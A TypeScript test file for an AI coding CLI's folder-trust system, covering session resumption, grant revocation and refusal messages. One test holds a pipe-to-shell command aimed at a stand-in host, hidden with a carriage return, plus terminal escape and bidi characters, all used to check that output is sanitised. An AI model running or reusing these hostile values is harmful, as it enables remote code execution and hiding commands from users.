// Sessions in other folders, grants over time, and the refusal texts. The scripted model, the shared root and the
// helpers are in fixture/trust-harness.ts; every `orb` here runs without ORBIT_TRUST_PROJECT, so a folder is trusted
// only when a grant says so, and each test uses a repository of its own.
import { expect, test } from "bun:test"
import fs from "node:fs/promises"
import { EOL } from "node:os"
import path from "node:path"
import type { TrustStatus } from "@orbit/client/promise"
import { SessionID } from "@orbit/schema/session-id"
import { holderRefusal, quoted, refusal, unanswered } from "../src/util/trust"
import { isolatedEnv } from "./fixture/environment"
import {
  model,
  runs,
  toolAnswers,
  root,
  workflow,
  suite,
  guard,
  user,
  hooked,
  quiet,
  bare,
  layered,
  orb,
  spawned,
  succeeded
} from "./fixture/trust-harness"
import { removeTree } from "../../core/test/fixture/remove-tree"

test("a session is checked and trusted in the folder it lives in, wherever the command starts", async () => {
  const repository = await hooked("session-home")
  const away = await quiet("session-away")
  const blocked = path.join(repository, "blocked.txt")
  const session = SessionID.create()
  // The session is made in the repository, which is trusted for that one run.
  succeeded(await orb(repository, ["run", "--trust", "--standalone", "--model", model, "--session", session, "say ok"]))
  const before = runs

  // Continued from a clean folder it still runs in the repository, which is untrusted, so nothing starts.
  const refused = await orb(away, ["run", "--standalone", "--model", model, "--session", session, "write blocked.txt"])
  const looped = await orb(away, [
    "loop",
    "10s",
    "check",
    "--times",
    "1",
    "--standalone",
    "--model",
    model,
    "-s",
    session,
  ])
  for (const result of [refused, looped]) {
    expect(result.code).toBe(1)
    expect(result.stderr).toContain(`${repository} is not trusted`)
  }
  expect(runs).toBe(before)
  expect(await Bun.file(blocked).exists()).toBe(false)

  // --trust goes to the folder the run happens in, so the repository's hook is in force there.
  const answered = toolAnswers.length
  succeeded(
    await orb(away, ["run", "--trust", "--standalone", "--model", model, "--session", session, "write blocked.txt"]),
  )
  expect(toolAnswers.slice(answered).join("")).toContain("Blocked by a PreToolUse hook")
  expect(await Bun.file(blocked).exists()).toBe(false)
}, 240_000)

test("a session in a trusted folder is not refused for the repository the command starts in", async () => {
  const repository = await hooked("session-start")
  const clean = await quiet("session-lives")
  const session = SessionID.create()
  succeeded(await orb(clean, ["trust", "--standalone"]))
  succeeded(await orb(clean, ["run", "--standalone", "--model", model, "--session", session, "say ok"]))

  const continued = await orb(repository, ["run", "--standalone", "--model", model, "--session", session, "say ok"])
  const looped = await orb(repository, [
    "loop",
    "10s",
    "check",
    "--times",
    "1",
    "--standalone",
    "--model",
    model,
    "-s",
    session,
  ])

  succeeded(continued)
  expect(continued.stdout).toContain("ran fine")
  succeeded(looped)
  // A session that does not exist yet starts where the command does, and so does --continue.
  for (const choice of [["--session", SessionID.create()], ["--continue"]]) {
    const started = await orb(repository, ["run", "--standalone", "--model", model, ...choice, "say ok"])
    expect(started.code).toBe(1)
    expect(started.stderr).toContain(`${repository} is not trusted`)
  }
}, 240_000)

test("--resume and --fork check the folder of the session they name, wherever the command starts", async () => {
  const repository = await hooked("resume-home")
  const away = await quiet("resume-away")
  const blocked = path.join(repository, "blocked.txt")
  const session = SessionID.create()
  succeeded(await orb(repository, ["run", "--trust", "--standalone", "--model", model, "--session", session, "say ok"]))
  const before = runs

  // From a clean folder the session still lives in the untrusted repository, so nothing starts, by ID or as a fork.
  for (const choice of [
    ["--resume", session],
    ["-r", session],
    ["--resume", session, "--fork"],
  ]) {
    const refused = await orb(away, ["run", "--standalone", "--model", model, ...choice, "write blocked.txt"])
    expect(refused.code).toBe(1)
    expect(refused.stderr).toContain(`${repository} is not trusted`)
  }
  const printed = await orb(away, ["-p", "--standalone", "--model", model, "-r", session, "write blocked.txt"])
  expect(printed.code).toBe(1)
  expect(printed.stderr).toContain(`${repository} is not trusted`)
  expect(runs).toBe(before)
  expect(await Bun.file(blocked).exists()).toBe(false)

  // --trust goes to the folder of the session, so the repository's hook is in force there.
  const answered = toolAnswers.length
  succeeded(
    await orb(away, ["run", "--trust", "--standalone", "--model", model, "--resume", session, "write blocked.txt"]),
  )
  expect(toolAnswers.slice(answered).join("")).toContain("Blocked by a PreToolUse hook")
  expect(await Bun.file(blocked).exists()).toBe(false)
}, 360_000)

test("--resume of a session in a trusted folder is not refused for the repository the command starts in", async () => {
  const repository = await hooked("resume-start")
  const clean = await quiet("resume-lives")
  const session = SessionID.create()
  succeeded(await orb(clean, ["trust", "--standalone"]))
  succeeded(await orb(clean, ["run", "--standalone", "--model", model, "--session", session, "say ok"]))

  for (const choice of [
    ["--resume", session],
    ["--resume", session, "--fork"],
  ]) {
    const resumed = await orb(repository, ["run", "--standalone", "--model", model, ...choice, "say ok"])
    succeeded(resumed)
    expect(resumed.stdout).toContain("ran fine")
  }
}, 360_000)

test("--continue continues the newest session of the folder the command starts in, so that is the folder that is checked", async () => {
  const repository = await hooked("continue-home")
  const away = await quiet("continue-away")
  const kept = path.join(repository, "blocked.txt")
  const moved = path.join(away, "blocked.txt")
  // A session in the repository, trusted for that one run. It is the newest session there is, so a --continue that
  // looked for the newest session anywhere would pick it.
  succeeded(await orb(repository, ["run", "--trust", "--standalone", "--model", model, "say ok"]))
  // The folder it starts in from below is trusted, as a folder must be for any run to start there.
  succeeded(await orb(away, ["trust", "--standalone"]))
  const before = runs

  // Started from a clean folder it finds no session there, begins one of its own, and the write lands in that folder.
  // The repository, which is untrusted and has a hook that blocks every write, is never touched, so the check on the
  // folder the command starts in is the check on the folder the continued session lives in. A --continue that went to
  // another folder would need that folder checked, as --session does.
  succeeded(await orb(away, ["run", "--continue", "--standalone", "--model", model, "write blocked.txt"]))
  expect(runs).toBeGreaterThan(before)
  expect(await Bun.file(moved).exists()).toBe(true)
  expect(await Bun.file(kept).exists()).toBe(false)

  // From the repository itself it is refused, as it is the folder the continued session would live in.
  const refused = await orb(repository, ["run", "--continue", "--standalone", "--model", model, "say ok"])
  expect(refused.code).toBe(1)
  expect(refused.stderr).toContain(`${repository} is not trusted`)
}, 240_000)

// trust-first part 2, D7 (owner, 2026-10-21: "match refrence"): as the reference reads project settings only from the
// project it starts in, config in a folder above the repository is never read. Trusting the repository does not trust
// the folder around it; a grant for the folder above covers the repository below it, and still the hook the file above
// names does not run.
test("config in a folder above the repository is never read, not even once a grant for that folder covers the repository", async () => {
  const { parent, child } = await layered("above")
  const guarded = path.join(parent, "orbit.json")
  const blocked = path.join(child, "blocked.txt")
  const before = runs

  const refused = await orb(child, ["run", "--standalone", "--model", model, "say ok"])
  expect(refused.code).toBe(1)
  expect(refused.stderr).toContain(`${child} is not trusted`)
  expect(refused.stderr).not.toContain(guarded)
  expect(runs).toBe(before)

  // Trusting the repository does not trust the folder around it: its hook is not read, and the write goes ahead.
  succeeded(await orb(child, ["trust", "--standalone"]))
  const ran = await orb(child, ["run", "--standalone", "--model", model, "write blocked.txt"])
  succeeded(ran)
  expect(await Bun.file(blocked).exists()).toBe(true)
  await fs.rm(blocked)

  // A grant for the folder above covers the repository below it, and the hook that folder names still does not run: the
  // write goes ahead again.
  succeeded(await orb(child, ["trust", "--standalone", "--revoke"]))
  succeeded(await orb(child, ["trust", "--standalone", parent]))
  const answered = toolAnswers.length
  const coveredRun = await orb(child, ["run", "--standalone", "--model", model, "write blocked.txt"])
  succeeded(coveredRun)
  expect(toolAnswers.slice(answered).join("")).not.toContain("Blocked by a PreToolUse hook")
  expect(await Bun.file(blocked).exists()).toBe(true)
}, 360_000)

test("orb run --format json reports a trust request that fails as the JSON error any failure before a session exists is", async () => {
  const gone = path.join(root, "work", "no-such-folder")

  for (const format of ["json", "stream-json"]) {
    const result = await orb(gone, ["run", "--standalone", "--format", format, "--model", model, "say ok"])

    expect(result.code).toBe(1)
    // The message names the folder that could not be checked, rather than leaving a bare status code.
    expect(JSON.parse(result.stdout)).toMatchObject({
      type: "error",
      sessionID: "",
      error: { type: "unknown", message: expect.stringContaining(`Could not check whether ${gone} is trusted`) },
    })
    expect(result.stderr).not.toContain("ClientError")
  }
  const result = await orb(gone, ["run", "--standalone", "--format", "result", "--model", model, "say ok"])
  expect(result.code).toBe(1)
  expect(JSON.parse(result.stdout)).toMatchObject({
    type: "result",
    is_error: true,
    error: expect.stringContaining(gone),
  })
}, 240_000)

test("orb trust --revoke ends the grant of a folder that was deleted, by its name, and says plainly when there is none", async () => {
  const repository = await hooked("gone")
  succeeded(await orb(repository, ["trust", "--standalone"]))
  await removeTree(repository)
  const listed = await orb(root, ["trust", "--standalone", "--list"])
  succeeded(listed)
  expect(listed.stdout).toContain(repository)

  // The folder is not there: the server matches the name, and does not look at the disk.
  const spelled = process.platform === "win32" ? repository.toUpperCase() : repository
  const revoked = await orb(root, ["trust", "--standalone", "--revoke", spelled])

  succeeded(revoked)
  expect(revoked.stdout).toContain(`Stopped trusting ${repository}`)
  expect(revoked.stderr).not.toContain("Not a folder")
  const after = await orb(root, ["trust", "--standalone", "--list"])
  succeeded(after)
  expect(after.stdout).not.toContain(repository)

  // A folder that was never trusted, and is not there either, gets the plain answer a folder that is there gets.
  const never = path.join(root, "work", "never-granted")
  const none = await orb(root, ["trust", "--standalone", "--revoke", never])
  succeeded(none)
  expect(none.stdout).toContain(`${never} is not trusted.`)
  // A typo that names no grant and no folder is not an error either: revoking only narrows trust.
  const again = await orb(root, ["trust", "--standalone", "--revoke", repository])
  succeeded(again)
  expect(again.stdout).toContain("is not trusted.")
}, 240_000)

// A folder name that acts on a terminal: it moves the title and clears the screen.
const escaping = "inner]0;owned[2J"

test("orb trust prints a folder name that acts on a terminal without its control characters, on every line that names one", async () => {
  // Not a folder: the name is the argument as typed, which no platform needs to accept as a file name.
  const typo = await orb(root, ["trust", "--standalone", escaping])
  expect(typo.code).toBe(1)
  expect(typo.stderr).toContain("Not a folder:")
  expect(typo.stderr).not.toContain("")
  expect(typo.stderr).not.toContain("")
}, 120_000)

// Windows does not allow a control character in a file name, so the lines that name a stored folder are tried where it does.
test.skipIf(process.platform === "win32")(
  "orb trust --list and --revoke print a stored folder name without its control characters",
  async () => {
    const repository = path.join(root, "work", `escaping-${escaping}`)
    await Bun.write(path.join(repository, "orbit.json"), JSON.stringify(guard))
    succeeded(await orb(repository, ["trust", "--standalone"]))
    const listed = await orb(root, ["trust", "--standalone", "--list"])
    succeeded(listed)
    expect(listed.stdout).toContain("escaping-")
    expect(listed.stdout).not.toContain("")
    await fs.rm(repository, { recursive: true, force: true })
    const revoked = await orb(root, ["trust", "--standalone", "--revoke", repository])
    succeeded(revoked)
    expect(revoked.stdout).toContain("Stopped trusting")
    expect(revoked.stdout).not.toContain("")
  },
  240_000,
)

// trust-first part 2, D8 (owner, 2026-10-21: "match refrence"): as the reference does, a trusted folder's config loads as
// it is now. A change after the grant neither stops a command nor waits for a new grant: the hook a pull adds runs.
test("orb run goes ahead in a trusted folder whose config changed after the grant, and the hook the change adds runs", async () => {
  const repository = path.join(root, "work", "changed")
  const blocked = path.join(repository, "blocked.txt")
  await Bun.write(path.join(repository, "orbit.json"), JSON.stringify({}))
  succeeded(await orb(repository, ["trust", "--standalone"]))
  succeeded(await orb(repository, ["run", "--standalone", "--model", model, "write blocked.txt"]))
  expect(await Bun.file(blocked).exists()).toBe(true)
  await fs.rm(blocked)

  // A pull adds a hook that blocks every write to the settings of the folder.
  await Bun.write(path.join(repository, "orbit.json"), JSON.stringify(guard))
  const answered = toolAnswers.length
  const ran = await orb(repository, ["run", "--standalone", "--model", model, "write blocked.txt"])

  succeeded(ran)
  expect(ran.stderr).not.toContain("changed since the folder was trusted")
  expect(toolAnswers.slice(answered).join("")).toContain("Blocked by a PreToolUse hook")
  expect(await Bun.file(blocked).exists()).toBe(false)

  // There is nothing new to trust: the folder is trusted as it stands.
  const again = await orb(repository, ["trust", "--standalone"])
  succeeded(again)
  expect(again.stdout).toContain("already trusted")
  expect(again.stdout).not.toContain("again")
}, 300_000)

// The command in the advice, as a person types it after the prompt. Quoted names stay in one piece.
function printed(text: string) {
  const command = text.match(/`(orb trust [^`]+)`/)?.[1]
  if (command === undefined) throw new Error(`no command in: ${text}`)
  return [...command.matchAll(/"([^"]*)"|(\S+)/g)].map((match) => match[1] ?? match[2]).slice(2)
}

// An outer repository O, a plain folder M in it with settings that run a hook, and an inner repository I in M. The
// project of M is O, so a plain `orb trust M` grants O and leaves what M holds back for I where it was.
async function nested(name: string) {
  const outer = path.join(root, "work", name)
  const middle = path.join(outer, "middle")
  const inner = path.join(middle, "inner")
  await fs.mkdir(inner, { recursive: true })
  await Bun.write(path.join(middle, "orbit.json"), JSON.stringify(guard))
  for (const folder of [outer, inner]) expect((await spawned(["git", "init", "--quiet", folder])).code).toBe(0)
  return { outer, middle, inner }
}

// trust-first: a grant for a repository covers the repositories inside it, so trusting the folder that holds config
// between them, whose project is the outer repository, trusts the inner one as well.
test("trusting a folder whose project is an outer repository covers the repository inside it", async () => {
  const { outer, middle, inner } = await nested("nested")
  const before = runs
  const refused = await orb(inner, ["run", "--standalone", "--model", model, "say ok"])
  expect(refused.code).toBe(1)
  expect(refused.stderr).toContain(`${inner} is not trusted`)
  expect(runs).toBe(before)

  // Trusting M through a location of its own opens a project that is O, which is what is granted, and O covers I.
  const plain = await orb(root, ["trust", "--standalone", middle])
  succeeded(plain)
  expect(plain.stdout).toContain(`Trusted ${outer}`)
  succeeded(await orb(inner, ["run", "--standalone", "--model", model, "say ok"]))
}, 300_000)

// trust-first: orb acp no longer warns about the folder it starts in; it refuses a session there instead
// (acp/trust-first.subprocess.test.ts), and stdout stays the protocol's.
test("orb acp writes nothing about the folder it starts in, and keeps stdout for the protocol", async () => {
  const repository = await hooked("acp")
  const cli = path.join(import.meta.dir, "..")
  // ACP takes the folder from the process itself rather than from PWD, so the process, and the private server it
  // starts, run in the repository. Bun finds its preload for the terminal UI's JSX in the folder it starts in, which
  // here is the repository, so the repository names it.
  await Bun.write(
    path.join(repository, "bunfig.toml"),
    `preload = [${JSON.stringify(Bun.resolveSync("@opentui/solid/preload", cli))}]\n`,
  )
  const child = Bun.spawn([process.execPath, "run", path.join(cli, "src", "index.ts"), "acp"], {
    cwd: repository,
    env: isolatedEnv(root, {
      USERPROFILE: root,
      ORBIT_TRUST_PROJECT: undefined,
      ORBIT_CONFIG: undefined,
      ORBIT_CONFIG_CONTENT: undefined,
      OLLAMA_CONTEXT_LENGTH: undefined,
    }),
    stdin: "pipe",
    stdout: "pipe",
    stderr: "pipe",
  })
  let stderr = ""
  const errors = (async () => {
    for await (const chunk of child.stderr) stderr += new TextDecoder().decode(chunk)
  })()
  const lines = (async () => {
    const found: string[] = []
    let buffered = ""
    for await (const chunk of child.stdout) {
      buffered += new TextDecoder().decode(chunk)
      const complete = buffered.split("\n")
      buffered = complete.pop() ?? ""
      found.push(...complete.filter((line) => line.trim() !== ""))
    }
    return [...found, ...(buffered.trim() === "" ? [] : [buffered])]
  })()
  try {
    child.stdin.write(
      JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "initialize",
        params: { protocolVersion: 1, clientCapabilities: {}, clientInfo: { name: "trust-test", version: "0" } },
      }) + "\n",
    )
    await child.stdin.flush()
    await Bun.sleep(5_000)
  } finally {
    await child.stdin.end()
  }
  await Promise.all([child.exited, errors])
  const frames = await lines

  expect(stderr).not.toContain("orb acp:")
  expect(stderr).not.toContain("is not trusted")
  // Everything on stdout is a JSON-RPC message: the answer to initialize.
  expect(frames.length).toBeGreaterThan(0)
  for (const frame of frames) expect(JSON.parse(frame)).toMatchObject({ jsonrpc: "2.0" })
  expect(frames.some((frame) => JSON.parse(frame).id === 1)).toBe(true)
}, 180_000)

// Folders that the pure functions below only print, so they need not exist.
const repo = path.resolve("/trust-repo")
const outer = path.resolve("/trust-outer")

test("the refusal names what is held back, and says what a home directory needs instead", () => {
  const folder = repo
  const status = {
    directory: folder,
    trusted: false,
    persistent: true,
    withheld: [
      { path: path.join(folder, "orbit.json"), kinds: ["hooks", "mcp"] },
      { path: path.join(folder, ".orbit"), kinds: ["plugins"] },
    ],
  } satisfies TrustStatus

  const text = refusal(status)

  expect(text).toContain(`${folder} is not trusted`)
  expect(text).toMatch(/^ {2}orbit\.json\s+hooks, mcp$/m)
  expect(text).toMatch(/^ {2}\.orbit\s+plugins$/m)
  expect(text).toContain("`orb trust`")
  expect(text).toContain("--trust")
  // Nothing above the project is read (D7), so the refusal names no other folder to trust.
  expect(text).not.toContain("--for")

  const home = refusal({ ...status, persistent: false })
  expect(home).toContain("home directory or a filesystem root")
  expect(home).toContain("`orb trust` refuses it")
  expect(home).toContain("--trust")
})

test("the refusal for a command that imports a file says it runs code from the folder, whether or not config is held back", () => {
  const file = path.join(repo, "workflows", "plan.ts")
  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus

  const text = refusal(status, file)

  expect(text).toContain(`${repo} is not trusted`)
  expect(text).toContain("runs code from the folder")
  // The file is named from the folder, as the files that are held back are.
  expect(text).toContain(`it imports ${path.join("workflows", "plan.ts")},`)
  expect(text).not.toContain(file)
  expect(text).toContain(
    "Look the file over, then trust the folder for good with `orb trust`, or for this run only with --trust.",
  )
  // The folder holds nothing back, so there is no list.
  expect(text).not.toContain("holds back")

  const held = refusal({ ...status, withheld: [{ path: path.join(repo, "orbit.json"), kinds: ["hooks"] }] }, file)
  expect(held).toContain("runs code from the folder")
  expect(held).toContain("The project config it finds also holds back what could run code or reach the network:")
  expect(held).toMatch(/^ {2}orbit\.json\s+hooks$/m)
  expect(held).toContain("Look the file and those files over, then trust the folder")

  // A file outside the folder is named in full.
  expect(refusal(status, path.join(outer, "plan.ts"))).toContain(`it imports ${path.join(outer, "plan.ts")},`)

  const home = refusal({ ...status, persistent: false }, file)
  expect(home).toContain("runs code from the folder")
  expect(home).toContain("home directory or a filesystem root")
  expect(home).toContain("`orb trust` refuses it")
  expect(home).toContain("--trust")
  expect(home).not.toContain("Look the file over")
})

test("the refusal for a command that runs the shell commands of a file lists them, whether or not config is held back", () => {
  const file = path.join(repo, "flows", "feature.yaml")
  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus
  const commands = [
    { id: "tests", command: "npm test" },
    { id: "api", command: "npm run build" },
    { id: "api", command: "npm run lint" },
  ]

  const text = refusal(status, undefined, { file, commands, approvals: [], agents: [], models: [] })

  expect(text).toContain(`${repo} is not trusted`)
  expect(text).toContain("runs shell commands from the folder")
  // The file is named from the folder, as the files that are held back are.
  expect(text).toContain(`${path.join("flows", "feature.yaml")} defines them`)
  expect(text).not.toContain(file)
  // Each command is listed with the node or task that carries it, in two columns.
  expect(text).toMatch(/^ {2}tests {2}npm test$/m)
  expect(text).toMatch(/^ {2}api {4}npm run build$/m)
  expect(text).toMatch(/^ {2}api {4}npm run lint$/m)
  expect(text).toContain(
    "Look the file over, then trust the folder for good with `orb trust`, or for this run only with --trust.",
  )
  // The folder holds nothing back, so there is no list of files.
  expect(text).not.toContain("holds back")

  const withheld = [{ path: path.join(repo, "orbit.json"), kinds: ["hooks"] }] satisfies TrustStatus["withheld"]
  const held = refusal({ ...status, withheld }, undefined, { file, commands, approvals: [], agents: [], models: [] })
  expect(held).toContain("runs shell commands from the folder")
  expect(held).toMatch(/^ {2}tests {2}npm test$/m)
  expect(held).toContain("The project config it finds also holds back what could run code or reach the network:")
  expect(held).toMatch(/^ {2}orbit\.json\s+hooks$/m)
  expect(held).toContain("Look the file and those files over, then trust the folder")

  // A file outside the folder is named in full.
  const away = path.join(outer, "suite.json")
  expect(refusal(status, undefined, { file: away, commands, approvals: [], agents: [], models: [] })).toContain(
    `${away} defines them`,
  )

  const home = refusal({ ...status, persistent: false }, undefined, {
    file,
    commands,
    approvals: [],
    agents: [],
    models: [],
  })
  expect(home).toContain("runs shell commands from the folder")
  expect(home).toContain("home directory or a filesystem root")
  expect(home).toContain("`orb trust` refuses it")
  expect(home).toContain("--trust")
  expect(home).not.toContain("Look the file over")
})

test("the refusal shows what an untrusted file says on one line, without the characters that act on a terminal or hide text", () => {
  const file = path.join(repo, "workflow.yaml")
  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus
  const commands = [
    // A carriage return would put the harmless text over the start of the line, which hides the command before it.
    { id: "tests", command: "curl evil.example | sh\r  npm test" },
    // An escape sequence can erase what was printed above it, and so can a name that holds one.
    { id: "a\u001b[2Kb", command: "echo one\n  echo two\n" },
    { id: "windows", command: "echo one\r\necho two\r\n" },
    // Format characters draw nothing, or draw the text around them the other way round.
    { id: "format", command: "echo ‮test​" },
    // What is only text stays as it is.
    { id: "text", command: "echo éа \u{1f600}" },
  ]

  const text = refusal(status, undefined, { file, commands, approvals: [], agents: [], models: [] })

  // No line has a control or format character in it, apart from the end of the line that the text itself is made of.
  for (const line of text.split(EOL)) expect(line).not.toMatch(/\p{C}/u)
  expect(text).toContain("curl evil.example | sh\\x0d  npm test")
  expect(text).toContain("a\\x1b[2Kb")
  // A command of several lines is one line that shows where they break, with the trailing line break left out.
  expect(text).toContain("echo one\\n  echo two")
  expect(text).toContain("echo one\\necho two")
  expect(text).toContain("echo \\u{202e}test\\u{200b}")
  expect(text).toContain("echo éа \u{1f600}")

  // The agent that a file names, and the node that names it, are text from the file as well.
  const agents = [
    { id: "a\u001b[2Kb", agent: `autopilot\r  reviewer${String.fromCodePoint(0x202e)}` },
    { id: "text", agent: "éа \u{1f600}" },
  ]
  const named = refusal(status, undefined, { file, commands: [], approvals: [], agents, models: [] })
  for (const line of named.split(EOL)) expect(line).not.toMatch(/\p{C}/u)
  expect(named).toContain("a\\x1b[2Kb")
  expect(named).toContain("agent: autopilot\\x0d  reviewer\\u{202e}")
  expect(named).toContain("agent: éа \u{1f600}")
})

test("the refusal for a command that carries out a file's approvals lists each node with what it sets, with or without shell commands", () => {
  const file = path.join(repo, "flows", "feature.yaml")
  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus
  const approvals = [
    { id: "api", permissions: "auto" },
    { id: "crew/coder", permissions: "auto" },
    { id: "later", permissions: "{{plan.text}}" },
  ]

  const text = refusal(status, undefined, { file, commands: [], approvals, agents: [], models: [] })

  expect(text).toContain(`${repo} is not trusted`)
  expect(text).toContain("this command approves actions without asking you")
  // The file is named from the folder, as the files that are held back are.
  expect(text).toContain(`${path.join("flows", "feature.yaml")} sets \`permissions\``)
  expect(text).not.toContain(file)
  // Each node is listed with what it sets, as written, in two columns.
  expect(text).toMatch(/^ {2}api {9}permissions: auto$/m)
  expect(text).toMatch(/^ {2}crew\/coder {2}permissions: auto$/m)
  expect(text).toMatch(/^ {2}later {7}permissions: \{\{plan\.text\}\}$/m)
  expect(text).toContain(
    "Look the file over, then trust the folder for good with `orb trust`, or for this run only with --trust.",
  )
  // The file defines no command and the folder holds nothing back, so neither is named.
  expect(text).not.toContain("shell commands")
  expect(text).not.toContain("holds back")

  // A file with commands as well lists both, the commands first, each in a paragraph of its own.
  const both = refusal(status, undefined, {
    file,
    commands: [{ id: "tests", command: "npm test" }],
    approvals,
    agents: [],
    models: [],
  })
  expect(both).toContain("this command runs shell commands from the folder")
  expect(both).toContain("It also approves actions without asking you")
  expect(both).toMatch(/^ {2}tests {2}npm test$/m)
  expect(both).toMatch(/^ {2}api {9}permissions: auto$/m)
  expect(both.indexOf("npm test")).toBeLessThan(both.indexOf("It also approves"))

  // Config that is held back, a home directory and config above the project are named as they are for the other files.
  const withheld = [{ path: path.join(repo, "orbit.json"), kinds: ["hooks"] }] satisfies TrustStatus["withheld"]
  const held = refusal({ ...status, withheld }, undefined, { file, commands: [], approvals, agents: [], models: [] })
  expect(held).toContain("this command approves actions without asking you")
  expect(held).toContain("The project config it finds also holds back what could run code or reach the network:")
  expect(held).toMatch(/^ {2}orbit\.json\s+hooks$/m)
  expect(held).toContain("Look the file and those files over, then trust the folder")

  const home = refusal({ ...status, persistent: false }, undefined, {
    file,
    commands: [],
    approvals,
    agents: [],
    models: [],
  })
  expect(home).toContain("this command approves actions without asking you")
  expect(home).toContain("home directory or a filesystem root")
  expect(home).toContain("--trust")
  expect(home).not.toContain("Look the file over")
})

test("the refusal for a command that runs a file's agents lists each node with the agent it names, with or without commands and approvals", () => {
  const file = path.join(repo, "flows", "feature.yaml")
  const status = { directory: repo, trusted: false, persistent: true, withheld: [] } satisfies TrustStatus
  const agents = [
    { id: "api", agent: "autopilot" },
    { id: "api/judge", agent: "reviewer" },
    { id: "crew/coder", agent: "autopilot" },
    { id: "later", agent: "{{plan.text}}" },
  ]

  const text = refusal(status, undefined, { file, commands: [], approvals: [], agents, models: [] })

  expect(text).toContain(`${repo} is not trusted`)
  expect(text).toContain("this command lets the file choose which of your agents run its nodes")
  // The file is named from the folder, as the files that are held back are.
  expect(text).toContain(`${path.join("flows", "feature.yaml")} names an \`agent\``)
  expect(text).not.toContain(file)
  // It says why that matters: the agent's own rules come after the user's and win.
  expect(text).toContain("an agent's own rules are added after your global rules, where the last match wins")
  // Each node is listed with the agent it names, as written, in two columns.
  expect(text).toMatch(/^ {2}api {9}agent: autopilot$/m)
  expect(text).toMatch(/^ {2}api\/judge {3}agent: reviewer$/m)
  expect(text).toMatch(/^ {2}crew\/coder {2}agent: autopilot$/m)
  expect(text).toMatch(/^ {2}later {7}agent: \{\{plan\.text\}\}$/m)
  expect(text).toContain(
    "Look the file over, then trust the folder for good with `orb trust`, or for this run only with --trust.",
  )
  // The file defines no command or approval and the folder holds nothing back, so none is named.
  expect(text).not.toContain("shell commands")
  expect(text).not.toContain("approves actions")
  expect(text).not.toContain("holds back")

  // A file with commands and approvals as well lists all three, in that order, each in a paragraph of its own.
  const all = refusal(status, undefined, {
    file,
    commands: [{ id: "tests", command: "npm test" }],
    approvals: [{ id: "api", permissions: "auto" }],
    agents,
    models: [],
  })
  expect(all).toContain("this command runs shell commands from the folder")
  expect(all).toContain("It also approves actions without asking you")
  expect(all).toContain("It also lets the file choose which of your agents run its nodes")
  expect(all).toMatch(/^ {2}tests {2}npm test$/m)
  expect(all).toMatch(/^ {2}api {2}permissions: auto$/m)
  expect(all).toMatch(/^ {2}api {9}agent: autopilot$/m)
  expect(all.indexOf("npm test")).toBeLessThan(all.indexOf("It also approves"))
  expect(all.indexOf("It also approves")).toBeLessThan(all.indexOf("It also lets the file choose"))

  // Config that is held back, a home directory and config above the project are named as they are for the other files.
  const withheld = [{ path: path.join(repo, "orbit.json"), kinds: ["hooks"] }] satisfies TrustStatus["withheld"]
  const held = refusal({ ...status, withheld }, undefined, { file, commands: [], approvals: [], agents, models: [] })
  expect(held).toContain("this command lets the file choose which of your agents run its nodes")
  expect(held).toContain("The project config it finds also holds back what could run code or reach the network:")
  expect(held).toMatch(/^ {2}orbit\.json\s+hooks$/m)
  expect(held).toContain("Look the file and those files over, then trust the folder")

  const home = refusal({ ...status, persistent: false }, undefined, {
    file,
    commands: [],
    approvals: [],
    agents,
    models: [],
  })
  expect(home).toContain("this command lets the file choose which of your agents run its nodes")
  expect(home).toContain("home directory or a filesystem root")
  expect(home).toContain("--trust")
  expect(home).not.toContain("Look the file over")
})

test("the refusal for the folder that holds the file names that folder to trust and what the file brings, and none of its config", () => {
  const module = path.join(outer, "flows", "plan.ts")
  const file = path.join(outer, "flows", "feature.yaml")
  const withheld = [{ path: path.join(outer, "orbit.json"), kinds: ["hooks"] }] satisfies TrustStatus["withheld"]
  const status = { directory: outer, trusted: false, persistent: true, withheld } satisfies TrustStatus

  const imports = holderRefusal(status, module)

  expect(imports).toContain(`${outer} is not trusted`)
  expect(imports).toContain("this command runs code from the folder")
  // The file is named from the folder, as it is in the other refusals.
  expect(imports).toContain(`it imports ${path.join("flows", "plan.ts")},`)
  // The folder of the run is trusted already, so a plain `orb trust` would not help: the command names the folder.
  expect(imports).toContain("The file is in another project than the one the command runs in")
  expect(imports).toContain(`trust its folder for good with \`orb trust ${outer}\`, or for this run only with --trust.`)
  // The run applies none of the config of that folder, so it is not listed.
  expect(imports).not.toContain("orbit.json")
  expect(imports).not.toContain("holds back")

  const defined = holderRefusal(status, undefined, {
    file,
    commands: [{ id: "tests", command: "npm test" }],
    approvals: [{ id: "api", permissions: "auto" }],
    agents: [{ id: "api/judge", agent: "autopilot" }],
    models: [],
  })
  expect(defined).toContain(`${outer} is not trusted`)
  expect(defined).toContain("this command runs shell commands from the folder")
  expect(defined).toContain(`${path.join("flows", "feature.yaml")} defines them`)
  expect(defined).toMatch(/^ {2}tests {2}npm test$/m)
  expect(defined).toContain("It also approves actions without asking you")
  expect(defined).toContain("It also lets the file choose which of your agents run its nodes")
  expect(defined).toContain(`\`orb trust ${outer}\``)
  expect(defined).not.toContain("holds back")

  // A folder with a space in its name is quoted as a shell takes it as one argument.
  const spaced = path.resolve("/trust spaced")
  expect(holderRefusal({ ...status, directory: spaced }, path.join(spaced, "plan.ts"))).toContain(
    `\`orb trust ${quoted(spaced)}\``,
  )

  // A home directory or a filesystem root cannot be trusted for good, so only --trust is offered.
  const home = holderRefusal({ ...status, persistent: false }, module)
  expect(home).toContain("home directory or a filesystem root")
  expect(home).toContain("`orb trust` refuses it")
  expect(home).toContain("--trust")
  expect(home).not.toContain("trust its folder for good")

  // What the file says is shown on one line, as it is for the folder of the run.
  const hidden = holderRefusal(status, path.join(outer, "flows", "a\u001b[8m.ts"))
  for (const line of hidden.split(EOL)) expect(line).not.toMatch(/\p{C}/u)
  expect(hidden).toContain(`${path.join("flows", "a")}\\x1b[8m.ts`)
})

// trust-first: a command that would only start work in the folder, such as `orb run` with no file of its own, stops in a
// folder that is not trusted, or that an older server cannot answer for, and says why the folder itself is what matters.
test("a command that brings nothing of its own is stopped by the folder itself, and says that nothing there is read until it is trusted", () => {
  const status = { directory: repo, trusted: false, persistent: true, withheld: [], changed: [] }
  const reason = "Nothing a folder holds is read, and no work starts there, until the folder is trusted"

  const refused = refusal(status)
  expect(refused).toContain(`${repo} is not trusted`)
